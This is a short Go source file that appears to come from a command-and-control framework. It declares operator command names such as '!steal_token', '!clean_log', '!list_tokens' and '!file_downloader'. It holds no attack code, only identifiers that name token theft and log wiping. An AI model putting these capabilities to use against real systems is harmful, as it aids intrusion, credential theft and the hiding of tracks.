/*
Package def defines shared data structures and constants.

C2Commands (prefixed with "!") are internal APIs used by the operator
for automated tasks like auto-completion and status tracking.
*/
package def

// C2Commands are internal APIs used by the operator
const (
	C2CmdListDir      = "!ls_dir" // API for path auto-completion
	C2CmdCleanLog     = "!clean_log"
	C2CmdStealToken   = "!steal_token"
	C2CmdListTokens   = "!list_tokens" // API for token auto-completion
	C2CmdCustomModule = "!custom_module"

	C2CmdStat           = "!stat"
	C2CmdListener       = "!listener"
	C2CmdFileDownloader = "!file_downloader"
)
